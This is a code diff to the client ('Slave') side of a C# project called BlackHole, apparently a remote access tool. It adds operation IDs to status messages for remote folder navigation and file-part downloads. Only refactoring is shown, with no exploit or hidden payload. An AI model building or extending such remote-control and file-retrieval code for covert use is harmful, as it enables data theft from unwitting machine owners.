@@ -71,14 +71,14 @@ namespace BlackHole.Slave
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(string operation, Exception exception) => SendStatus(operation, false, exception.ToString());
+        private void SendStatus(long operationId, string operation, Exception exception) => SendStatus(operationId, operation, false, exception.ToString());
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(string operation, string message) => SendStatus(operation, true, message);
+        private void SendStatus(long operationId, string operation, string message) => SendStatus(operationId, operation, true, message);
 
         /// <summary>
         /// 
@@ -86,10 +86,11 @@ namespace BlackHole.Slave
         /// <param name="operation"></param>
         /// <param name="success"></param>
         /// <param name="message"></param>
-        private void SendStatus(string operation, bool success, string message)
+        private void SendStatus(long operationId, string operation, bool success, string message)
         {
             Send(new StatusUpdateMessage()
             {
+                OperationId = operationId,
                 Operation = operation,
                 Success = success,
                 Message = message
@@ -117,28 +118,28 @@ namespace BlackHole.Slave
         /// 
         /// </summary>
         /// <typeparam name="T"></typeparam>
-        /// <param name="name"></param>
+        /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="messageBuilder"></param>
-        private void ExecuteSimpleOperation<T>(string name, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
-            => ExecuteComplexSendOperation(name, operation, (message) =>
+        private void ExecuteSimpleOperation<T>(long operationId, string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
+            => ExecuteComplexSendOperation(operationId, operationName, operation, (message) =>
             {
-                SendStatus(name, "Success : " + messageBuilder(message));
+                SendStatus(operationId, operationName, "Success : " + messageBuilder(message));
             });
 
         /// <summary>
         /// 
         /// </summary>
         /// <typeparam name="T"></typeparam>
-        /// <param name="name"></param>
+        /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="success"></param>
-        private void ExecuteComplexSendOperation<T>(string name, Func<T> operation, Action<T> success) where T : NetMessage
+        private void ExecuteComplexSendOperation<T>(long operationId, string operationName, Func<T> operation, Action<T> success) where T : NetMessage
             => Utility.ExecuteComplexOperation(operation, (message) =>
             {
                 Send(message);
                 success(message);
-            }, (e) => SendStatus(name, e));
+            }, (e) => SendStatus(operationId, operationName, e));
 
 
         /// <summary>
@@ -147,7 +148,7 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void NavigateToFolder(NavigateToFolderMessage message)
         {
-            ExecuteSimpleOperation("Folder navigation", 
+            ExecuteSimpleOperation(-1, "Folder navigation", 
                 () => FileHelper.NavigateToFolder(message.Path), 
                 (nav) => nav.Path);
         }
@@ -158,12 +159,12 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void DownloadFilePart(DownloadFilePartMessage message)
         {
-            ExecuteComplexSendOperation("File download",
+            ExecuteComplexSendOperation(message.Id, "File download",
                 () => FileHelper.DownloadFilePart(message.Id, message.CurrentPart, message.Path),
                 (part) =>
                 {
                     if (part.CurrentPart == part.TotalPart)
-                        SendStatus("File download", "Successfully downloaded : " + part.Path);
+                        SendStatus(message.Id, "File download", "Successfully downloaded : " + part.Path);
                 });
         }
     }
